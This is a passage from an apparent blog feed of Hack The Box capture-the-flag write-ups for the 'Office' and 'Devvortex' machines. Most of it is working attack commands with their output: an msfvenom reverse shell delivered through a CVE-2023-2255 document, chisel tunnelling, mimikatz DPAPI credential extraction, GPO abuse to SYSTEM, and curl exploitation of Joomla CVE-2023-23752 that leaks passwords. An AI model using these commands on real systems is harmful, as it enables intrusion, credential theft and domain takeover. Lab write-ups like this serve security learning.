src=\u0026#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js\u0026#34; integrity=\u0026#34;sha384-jjsmvgyd0p3pxb1rribzuayoiiy6orq6vrjieaff/njgzixfdsf4x0xim+b07jrm\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; let\u0026rsquo;s use chisel and forward the port and connect to it.\nattacker machine\nchisel server -p 4444 --reverse victim machine\nchisel client 10.10.16.59:4444 r:8083:127.0.0.1:8083 here\u0026rsquo;s the http service.\nand here\u0026rsquo;s the resume.php.\nprivilege escalation to ppots via cve-2023-2255\ncve-2023-2255 after doing a research i realized this exploit was exactly what i was looking for.\ni create a shell.exe file to get a reverse shell via msfvenom:\nmsfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=9001 -f exe -o shell.exe [-] no platform was selected, choosing msf::module::platform::windows from the payload [-] no arch selected, selecting arch: x86 from the payload no encoder specified, outputting raw payload payload size: 324 bytes final size of exe file: 73802 bytes saved as: shell.exe i create the exploit.odt file and transfer it to the following directory:\npython3 cve-2023-2255.py --cmd \u0026#39;c:\\programdata\\shell.exe\u0026#39; --output \u0026#39;exploit.odt\u0026#39; file exploit.odt has been created ! c:\\xampp\\htdocs\\internal\\applications\\exploit.odt after waiting few seconds i get reverse shell as ppotts user.\nrlwrap nc -lvnp 9001 listening on [any] 9001 ... connect to [10.10.15.29] from (unknown) [10.10.11.3] 53622 microsoft windows [version 10.0.20348.2322] (c) microsoft corporation. all rights reserved. c:\\program files\\libreoffice 5\\program\u0026gt;whoami whoami office\\ppotts shell as hhogan using mimikatz enumerate the credentials folders:\nps c:\\users\\ppotts\\appdata\\roaming\\microsoft\\credentials\u0026gt; get-childitem -hidden c:\\users\\ppotts\\appdata\\roaming\\microsoft\\credentials\\ directory: c:\\users\\ppotts\\appdata\\roaming\\microsoft\\credentials mode lastwritetime length name ---- ------------- ------ ---- -a-hs- 5/9/2023 2:08 pm 358 18a1927a997a794b65e9849883ac3f3e -a-hs- 5/9/2023 4:03 pm 398 84f1caeebf466550f4967858f9353fb4 -a-hs- 1/18/2024 11:53 am 374 e76cca3670cd9bb98df7 i use dpapi feature via mimikatz:\ndpapi (data protection api) is an api used for data protection and encryption operations in the microsoft windows operating system.\ndpapi::cred /in:c:\\users\\ppotts\\appdata\\roaming\\microsoft\\credentials\\xxxxxxxxxxx mimikatz # dpapi::cred /in:c:\\users\\ppotts\\appdata\\roaming\\microsoft\\credentials\\84f1caeebf466550f4967858f9353fb4 **blob** dwversion : 00000001 - 1 guidprovider : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb} dwmasterkeyversion : 00000001 - 1 guidmasterkey : {191d3f9d-7959-4b4d-a520-a444853c47eb} dwflags : 20000000 - 536870912 (system ; ) dwdescriptionlen : 0000003a - 58 szdescription : enterprise credential data algcrypt : 00006603 - 26115 (calg_3des) dwalgcryptlen : 000000c0 - 192 dwsaltlen : 00000010 - 16 pbsalt : 649c4466d5d647dd2c595f4e43fb7e1d dwhmackeylen : 00000000 - 0 pbhmackkey : alghash : 00008004 - 32772 (calg_sha1) dwalghashlen : 000000a0 - 160 dwhmac2keylen : 00000010 - 16 pbhmack2key : 32e88dfd1927fdef0ede5abf2c024e3a dwdatalen : 000000c0 - 192 pbdata : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97 dwsignlen : 00000014 - 20 pbsign : 21bfb22ca38e0a802e38065458cecef00b450976 i know i might need the guidmasterkey so i\u0026rsquo;m keeping it temporarily.\nnow i\u0026rsquo;ll enumarate this directory and got a sid number:\nps c:\\users\\ppotts\\appdata\\roaming\\microsoft\\protect\u0026gt; dir directory: c:\\users\\ppotts\\appdata\\roaming\\microsoft\\protect mode lastwritetime length name ---- ------------- ------ ---- d---s- 1/17/2024 3:43 pm s-1-5-21-1199398058-4196589450-691661856-1107 change sid and guidmasterkey to your own:\ndpapi::masterkey /in:c:\\users\\ppotts\\appdata\\roaming\\microsoft\\protect\\\\ /rpc mimikatz # dpapi::masterkey /in:c:\\users\\ppotts\\appdata\\roaming\\microsoft\\protect\\s-1-5-21-1199398058-4196589450-691661856-1107\\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc **masterkeys** dwversion : 00000002 - 2 szguid : {191d3f9d-7959-4b4d-a520-a444853c47eb} dwflags : 00000000 - 0 dwmasterkeylen : 00000088 - 136 dwbackupkeylen : 00000068 - 104 dwcredhistlen : 00000000 - 0 dwdomainkeylen : 00000174 - 372 [masterkey] **masterkey** dwversion : 00000002 - 2 salt : c521daa0857ee4fa6e4246266081e94c rounds : 00004650 - 18000 alghash : 00008009 - 32777 (calg_hmac) algcrypt : 00006603 - 26115 (calg_3des) pbkey : 1107e1ab3e107528a73a2dafc0a2db28de1ea0a07e92cff03a935635013435d75e41797f612903d6eea41a8fc4f7ebe8d2fbecb0c74cdebb1e7df3c692682a066faa3edf107792d116584625cc97f0094384a5be811e9d5ce84e5f032704330609171c973008d84f [backupkey] **masterkey** dwversion : 00000002 - 2 salt : a2741b13d7261697be4241ebbe05098a rounds : 00004650 - 18000 alghash : 00008009 - 32777 (calg_hmac) algcrypt : 00006603 - 26115 (calg_3des) pbkey : 21bf24763fbb1400010c08fccc5423fe7da8190c61d3006f2d5efd5ea586f463116805692bae637b2ab548828b3afb9313edc715edd11dc21143f4ce91f4f67afe987005320d3209 [domainkey] **domainkey** dwversion : 00000002 - 2 dwsecretlen : 00000100 - 256 dwaccesschecklen : 00000058 - 88 guidmasterkey : {e523832a-e126-4d6e-ac04-ed10da72b32f} pbsecret : 159613bdc2d90dd4834a37e29873ce04c74722a706d0ba4770865039b3520ff46cf9c9281542665df2e72db48f67e16e2014e07b88f8b2f7d376a8b9d47041768d650c20661aee31dc340aead98b7600662d2dc320b4f89cf7384c2a47809c024adf0694048c38d6e1e3e10e8bd7baa7a6f1214cd3a029f8372225b2df9754c19e2ae4bc5ff4b85755b4c2dfc89add9f73c54ac45a221e5a72d3efe491aa6da8fb0104a983be20af3280ae68783e8648df413d082fa7d25506e9e6de1aadbf9cf93ec8dfc5fab4bfe1dd1492dbb679b1fa25c3f15fb8500c6021f518c74e42cd4b5d5d6e1057f912db5479ebda56892f346b4e9bf6404906c7cd65a54eea2842 pbaccesscheck : 1430b9a3c4ab2e9d5f61dd6c62aab8e1742338623f08461fe991cccd5b3e4621d4c8e322650460181967c409c20efcf02e8936c007f7a506566d66ba57448aa8c3524f0b9cf881afcbb80c9d8c341026f3d45382f63f8665 auto sid from path seems to be: s-1-5-21-1199398058-4196589450-691661856-1107 [backupkey] without dpapi_system: key : 4d1b2c18baba7442e79d33cc771bf54027ae2500e08da3ecfccf91303bd471b6 sha1: eeb787c4259e3c8b8408201ee5e54fc29fad22b2 [domainkey] with rpc [dc] \u0026#39;office.htb\u0026#39; will be the domain [dc] \u0026#39;dc.office.htb\u0026#39; will be the dc server key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166 sha1: 85285eb368befb1670633b05ce58ca4d75c73c77 after using the this command i see the password of hhogan\ndpapi::cred /in:c:\\users\\ppotts\\appdata\\roaming\\microsoft\\credentials\\xxxxxxxxxxxxx /guidmasterkey:: mimikatz # dpapi::cred /in:c:\\users\\ppotts\\appdata\\roaming\\microsoft\\credentials\\84f1caeebf466550f4967858f9353fb4 /191d3f9d-7959-4b4d-a520-a444853c47eb::87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166 **blob** dwversion : 00000001 - 1 guidprovider : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb} dwmasterkeyversion : 00000001 - 1 guidmasterkey : {191d3f9d-7959-4b4d-a520-a444853c47eb} dwflags : 20000000 - 536870912 (system ; ) dwdescriptionlen : 0000003a - 58 szdescription : enterprise credential data algcrypt : 00006603 - 26115 (calg_3des) dwalgcryptlen : 000000c0 - 192 dwsaltlen : 00000010 - 16 pbsalt : 649c4466d5d647dd2c595f4e43fb7e1d dwhmackeylen : 00000000 - 0 pbhmackkey : alghash : 00008004 - 32772 (calg_sha1) dwalghashlen : 000000a0 - 160 dwhmac2keylen : 00000010 - 16 pbhmack2key : 32e88dfd1927fdef0ede5abf2c024e3a dwdatalen : 000000c0 - 192 pbdata : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97 dwsignlen : 00000014 - 20 pbsign : 21bfb22ca38e0a802e38065458cecef00b450976 decrypting credential: * volatile cache: guid:{191d3f9d-7959-4b4d-a520-a444853c47eb};keyhash:85285eb368befb1670633b05ce58ca4d75c73c77;key:available **credential** credflags : 00000030 - 48 credsize : 000000be - 190 credunk0 : 00000000 - 0 type : 00000002 - 2 - domain_password flags : 00000000 - 0 lastwritten : 5/9/2023 11:03:21 pm unkflagsorsize : 00000018 - 24 persist : 00000003 - 3 - enterprise attributecount : 00000000 - 0 unk0 : 00000000 - 0 unk1 : 00000000 - 0 targetname : domain:interactive=office\\hhogan unkdata : (null) comment : (null) targetalias : (null) username : office\\hhogan credentialblob : h4ppyftw183# attributes : evil-winrm -u \u0026#34;hhogan\u0026#34; -p \u0026#34;h4ppyftw183#\u0026#34; -i 10.10.11.3 evil-winrm shell v3.5 warning: remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine data: for more information, check evil-winrm github: https://github.com/hackplayers/evil-winrm#remote-path-completion info: establishing connection to remote endpoint *evil-winrm* ps c:\\users\\hhogan\\documents\u0026gt; shell as system i see that hhogan is in the gpo managers group and can write to the default domain group policy. this ability allows an attacker to perform a wide variety of attacks, they can execute commands via scheduled tasks, disable or modify system services, elevate privileges and more.\n*evil-winrm* ps c:\\users\\hhogan\\documents\u0026gt; whoami /groups group information ----------------- group name type sid attributes =========================================== ================ ============================================= ================================================== everyone well-known group s-1-1-0 mandatory group, enabled by default, enabled group builtin\\remote management users alias s-1-5-32-580 mandatory group, enabled by default, enabled group builtin\\users alias s-1-5-32-545 mandatory group, enabled by default, enabled group builtin\\pre-windows 2000 compatible access alias s-1-5-32-554 mandatory group, enabled by default, enabled group builtin\\certificate service dcom access alias s-1-5-32-574 mandatory group, enabled by default, enabled group nt authority\\network well-known group s-1-5-2 mandatory group, enabled by default, enabled group nt authority\\authenticated users well-known group s-1-5-11 mandatory group, enabled by default, enabled group nt authority\\this organization well-known group s-1-5-15 mandatory group, enabled by default, enabled group office\\gpo managers group s-1-5-21-1199398058-4196589450-691661856-1117 mandatory group, enabled by default, enabled group nt authority\\ntlm authentication well-known group s-1-5-64-10 mandatory group, enabled by default, enabled group mandatory label\\medium plus mandatory level label s-1-16-8448 *evil-winrm* ps c:\\users\\hhogan\\documents\u0026gt; get-gpo -all | select-object -expandproperty displayname windows firewall gpo default domain policy default active directory settings gpo default domain controllers policy windows update gpo windows update domain policy software installation gpo password policy now i add it to the computer as a local administrator via gpo.\n*evil-winrm* ps c:\\programdata\u0026gt; ./sharpgpoabuse.exe --addlocaladmin --useraccount hhogan --gponame \u0026#34;default domain policy\u0026#34; [+] domain = office.htb [+] domain controller = dc.office.htb [+] distinguished name = cn=policies,cn=system,dc=office,dc=htb [+] sid value of hhogan = s-1-5-21-1199398058-4196589450-691661856-1108 [+] guid of \u0026#34;default domain policy\u0026#34; is: {31b2f340-016d-11d2-945f-00c04fb984f9} [+] file exists: \\\\office.htb\\sysvol\\office.htb\\policies\\{31b2f340-016d-11d2-945f-00c04fb984f9}\\machine\\microsoft\\windows nt\\secedit\\gpttmpl.inf [+] the gpo does not specify any group memberships. [+] versionnumber attribute changed successfully [+] the version number in gpt.ini was increased successfully. [+] the gpo was modified to include a new local admin. wait for the gpo refresh cycle. [+] done! i update windows group policy settings:\n*evil-winrm* ps c:\\programdata\u0026gt; gpupdate /force updating policy... computer policy update has completed successfully. user policy update has completed successfully. i can easily see that hhogan are in the administrator group.\n*evil-winrm* ps c:\\programdata\u0026gt; net localgroup administrators alias name administrators comment administrators have complete and unrestricted access to the computer/domain members ------------------------------------------------------------------------------- administrator hhogan the command completed successfully. impacket-psexec.py hhogan:h4ppyftw183#@10.10.11.3 impacket v0.12.0.dev1+20230907.33311.3f645107 - copyright 2023 fortra [*] requesting shares on 10.10.11.3..... [*] found writable share admin$ [*] uploading file kbudclon.exe [*] opening svcmanager on 10.10.11.3..... [*] creating service nokz on 10.10.11.3..... [*] starting service nokz..... [!] press help for extra shell commands microsoft windows [version 10.0.20348.2322] (c) microsoft corporation. all rights reserved. c:\\windows\\system32\u0026gt; whoami nt authority\\system reference for root flag i followed namiq.net\u0026rsquo;s walkthrough.\n","title":"HTB Machine Office"},{"date":"2024-05-16","image":"","imageAlt":"","link":"http://localhost:1313/posts/htb-machines/devvortex/","summary":"Devvortex - HTB Recon Nmap Services Port Service 80 http (nginx/1.18.0) 22 ssh () Subdomains (VHost) $ ffuf -w ~/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://devvortex.htb -H \u0026quot;Host: FUZZ.devvortex.htb\u0026quot; -fs 154 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.","tags":["ctf","CVE-2023-23752","dev","htb","joomla","linux","vortex"],"text":"devvortex - htb recon nmap services port service 80 http (nginx/1.18.0) 22 ssh () subdomains (vhost) $ ffuf -w ~/seclists/discovery/web-content/raft-medium-directories-lowercase.txt -u http://devvortex.htb -h \u0026quot;host: fuzz.devvortex.htb\u0026quot; -fs 154 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: method : get :: url : http://devvortex.htb :: wordlist : fuzz: /home/neptune/seclists/discovery/web-content/raft-medium-directories-lowercase.txt :: header : host: fuzz.devvortex.htb :: follow redirects : false :: calibration : false :: timeout : 10 :: threads : 40 :: matcher : response status: 200-299,301,302,307,401,403,405,500 :: filter : response size: 154 ________________________________________________ dev [status: 200, size: 23221, words: 5081, lines: 502, duration: 135ms] :: progress: [26584/26584] :: job [1/1] :: 336 req/sec :: duration: [0:00:56] :: errors: 1 :: dev.devvortex.htb http enumeration - dev.devvortex.htb ffuf\n$ ffuf -w ~/seclists/discovery/web-content/raft-medium-directories-lowercase.txt:fuzz -u http://dev.devvortex.htb/fuzz /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: method : get :: url : http://dev.devvortex.htb/fuzz :: wordlist : fuzz: /home/neptune/seclists/discovery/web-content/raft-medium-directories-lowercase.txt :: follow redirects : false :: calibration : false :: timeout : 10 :: threads : 40 :: matcher : response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ modules [status: 301, size: 178, words: 6, lines: 8, duration: 75ms] templates [status: 301, size: 178, words: 6, lines: 8, duration: 68ms] tmp [status: 301, size: 178, words: 6, lines: 8, duration: 69ms] media [status: 301, size: 178, words: 6, lines: 8, duration: 69ms] cache [status: 301, size: 178, words: 6, lines: 8, duration: 70ms] images [status: 301, size: 178, words: 6, lines: 8, duration: 70ms] plugins [status: 301, size: 178, words: 6, lines: 8, duration: 71ms] includes [status: 301, size: 178, words: 6, lines: 8, duration: 71ms] language [status: 301, size: 178, words: 6, lines: 8, duration: 71ms] administrator [status: 301, size: 178, words: 6, lines: 8, duration: 91ms] libraries [status: 301, size: 178, words: 6, lines: 8, duration: 91ms] components [status: 301, size: 178, words: 6, lines: 8, duration: 75ms] api [status: 301, size: 178, words: 6, lines: 8, duration: 89ms] home [status: 200, size: 23221, words: 5081, lines: 502, duration: 423ms] layouts [status: 301, size: 178, words: 6, lines: 8, duration: 106ms] [status: 200, size: 23221, words: 5081, lines: 502, duration: 1176ms] cli [status: 301, size: 178, words: 6, lines: 8, duration: 149ms] :: progress: [26584/26584] :: job [1/1] :: 33 req/sec :: duration: [0:12:53] :: errors: 2 :: robots.txt - http://dev.devvortex.htb/robots.txt\n\u0026lt;---snipped---\u0026gt; user-agent: * disallow: /administrator/ disallow: /api/ disallow: /bin/ disallow: /cache/ disallow: /cli/ disallow: /components/ disallow: /includes/ disallow: /installation/ disallow: /language/ disallow: /layouts/ disallow: /libraries/ disallow: /logs/ disallow: /modules/ disallow: /plugins/ disallow: /tmp/ readme.txt\njoomla! cms 1- overview * this is a joomla! 4.x installation/upgrade package. * joomla! official site: https://www.joomla.org * joomla! 4.2 version history - https://docs.joomla.org/special:mylanguage/joomla_4.2_version_history * detailed changes in the changelog: https://github.com/joomla/joomla-cms/commits/4.2-dev \u0026lt;---snipped---\u0026gt; services running\njoomla cms 4.2 vulnerability assessment - joomla cms 4.2 vulnerability: joomla cms 4.2 is vulnerable to unauthenticated information disclosure (cve-2023-23752) due to improper access check in core webservice endpoints. the affected versions are 4.0.0-4.2.7 in range. due to flaws in joomlas access control to web service endpoints, unauthenticated attackers access the restapi interface to obtain joomla-related configuration information by constructing specially crafted requests, which eventually leads to the disclosure of sensitive information. for more on the vulnerability :\nns focus global vuln check poc: a publicly available exploit is published on exploitdb. we can use this {root_url}/api/index.php/v1/users?public=true rest endpoint to obtain user information , and this {root_url}/api/index.php/v1/config/application?public=true endpoint for application configuration.\njoomla cms 4.2 exploiting cve-2023-23752 user information:\n$ curl http://dev.devvortex.htb/api/v1/users?public=true {\u0026quot;links\u0026quot;:{\u0026quot;self\u0026quot;:\u0026quot;http:\\/\\/dev.devvortex.htb\\/api\\/v1\\/users?public=true\u0026quot;},\u0026quot;data\u0026quot;:[{\u0026quot;type\u0026quot;:\u0026quot;users\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;649\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;id\u0026quot;:649,\u0026quot;name\u0026quot;:\u0026quot;lewis\u0026quot;,\u0026quot;username\u0026quot;:\u0026quot;lewis\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;lewis@devvortex.htb\u0026quot;,\u0026quot;block\u0026quot;:0,\u0026quot;sendemail\u0026quot;:1,\u0026quot;registerdate\u0026quot;:\u0026quot;2023-09-25 16:44:24\u0026quot;,\u0026quot;lastvisitdate\u0026quot;:\u0026quot;2024-04-26 10:37:12\u0026quot;,\u0026quot;lastresettime\u0026quot;:null,\u0026quot;resetcount\u0026quot;:0,\u0026quot;group_count\u0026quot;:1,\u0026quot;group_names\u0026quot;:\u0026quot;super users\u0026quot;}},{\u0026quot;type\u0026quot;:\u0026quot;users\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;650\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;id\u0026quot;:650,\u0026quot;name\u0026quot;:\u0026quot;logan paul\u0026quot;,\u0026quot;username\u0026quot;:\u0026quot;logan\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;logan@devvortex.htb\u0026quot;,\u0026quot;block\u0026quot;:0,\u0026quot;sendemail\u0026quot;:0,\u0026quot;registerdate\u0026quot;:\u0026quot;2023-09-26 19:15:42\u0026quot;,\u0026quot;lastvisitdate\u0026quot;:null,\u0026quot;lastresettime\u0026quot;:null,\u0026quot;resetcount\u0026quot;:0,\u0026quot;group_count\u0026quot;:1,\u0026quot;group_names\u0026quot;:\u0026quot;registered\u0026quot;}}],\u0026quot;meta\u0026quot;:{\u0026quot;total-pages\u0026quot;:1}} application config:\n$ curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true {\u0026quot;links\u0026quot;:{\u0026quot;self\u0026quot;:\u0026quot;http:\\/\\/dev.devvortex.htb\\/api\\/index.php\\/v1\\/config\\/application?public=true\u0026quot;,\u0026quot;next\u0026quot;:\u0026quot;http:\\/\\/dev.devvortex.htb\\/api\\/index.php\\/v1\\/config\\/application?public=true\u0026amp;page%5boffset%5d=20\u0026amp;page%5blimit%5d=20\u0026quot;,\u0026quot;last\u0026quot;:\u0026quot;http:\\/\\/dev.devvortex.htb\\/api\\/index.php\\/v1\\/config\\/application?public=true\u0026amp;page%5boffset%5d=60\u0026amp;page%5blimit%5d=20\u0026quot;},\u0026quot;data\u0026quot;:[{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;offline\u0026quot;:false,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;offline_message\u0026quot;:\u0026quot;this site is down for maintenance.\u0026lt;br\u0026gt;please check back again soon.\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;display_offline_message\u0026quot;:1,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;offline_image\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;sitename\u0026quot;:\u0026quot;development\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;editor\u0026quot;:\u0026quot;tinymce\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;captcha\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;list_limit\u0026quot;:20,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;access\u0026quot;:1,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;debug\u0026quot;:false,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;debug_lang\u0026quot;:false,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;debug_lang_const\u0026quot;:true,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;dbtype\u0026quot;:\u0026quot;mysqli\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;host\u0026quot;:\u0026quot;localhost\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;user\u0026quot;:\u0026quot;lewis\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;password\u0026quot;:\u0026quot;p4ntherg0t1n5r3c0n##\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;db\u0026quot;:\u0026quot;joomla\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;dbprefix\u0026quot;:\u0026quot;sd4fg_\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;dbencryption\u0026quot;:0,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;dbsslverifyservercert\u0026quot;:false,\u0026quot;id\u0026quot;:224}}],\u0026quot;meta\u0026quot;:{\u0026quot;total-pages\u0026quot;:4}} we can see from the meta that it\u0026rsquo;s only page 1 out of 4. we should gather all the data from this api using the next link and save it to a file.\nusers and credentials users:\nlewis:\n{ \u0026quot;id\u0026quot;: 649, \u0026quot;name\u0026quot;: \u0026quot;lewis\u0026quot;, \u0026quot;username\u0026quot;: \u0026quot;lewis\u0026quot;, \u0026quot;email\u0026quot;: \u0026quot;lewis@devvortex.htb\u0026quot;, \u0026quot;block\u0026quot;: 0, \u0026quot;sendemail\u0026quot;: 1, \u0026quot;registerdate\u0026quot;: \u0026quot;2023-09-25 16:44:24\u0026quot;, \u0026quot;lastvisitdate\u0026quot;: \u0026quot;2024-04-26 10:37:12\u0026quot;, \u0026quot;lastresettime\u0026quot;: null, \u0026quot;resetcount\u0026quot;: 0, \u0026quot;group_count\u0026quot;: 1, \u0026quot;group_names\u0026quot;: \u0026quot;super users\u0026quot; } logan:\n{ \u0026quot;id\u0026quot;: 650, \u0026quot;name\u0026quot;: \u0026quot;logan paul\u0026quot;, \u0026quot;username\u0026quot;: \u0026quot;logan\u0026quot;, \u0026quot;email\u0026quot;: \u0026quot;logan@devvortex.htb\u0026quot;, \u0026quot;block\u0026quot;: 0, \u0026quot;sendemail\u0026quot;: 0, \u0026quot;registerdate\u0026quot;: \u0026quot;2023-09-26 19:15:42\u0026quot;, \u0026quot;lastvisitdate\u0026quot;: null, \u0026quot;lastresettime\u0026quot;: null, \u0026quot;resetcount\u0026quot;: 0, \u0026quot;group_count\u0026quot;: 1, \u0026quot;group_names\u0026quot;: \u0026quot;registered\u0026quot; } credentials:\nlewis:\n{ \u0026quot;type\u0026quot;: \u0026quot;application\u0026quot;, \u0026quot;id\u0026quot;: \u0026quot;224\u0026quot;, \u0026quot;attributes\u0026quot;: { \u0026quot;user\u0026quot;: \u0026quot;lewis\u0026quot;, \u0026quot;id\u0026quot;: 224 } }, { \u0026quot;type\u0026quot;: \u0026quot;application\u0026quot;, \u0026quot;id\u0026quot;: \u0026quot;224\u0026quot;, \u0026quot;attributes\u0026quot;: { \u0026quot;password\u0026quot;: \u0026quot;p4ntherg0t1n5r3c0n##\u0026quot;, \u0026quot;id\u0026quot;: 224 } }, we can try this creds to log into the admin dashboard of joomla at http://dev.devvortex.htb/administrator.\nadmin dashboard enumeration php: 7.4.3 which is obsolete and no longer receives official security updates. mysql: 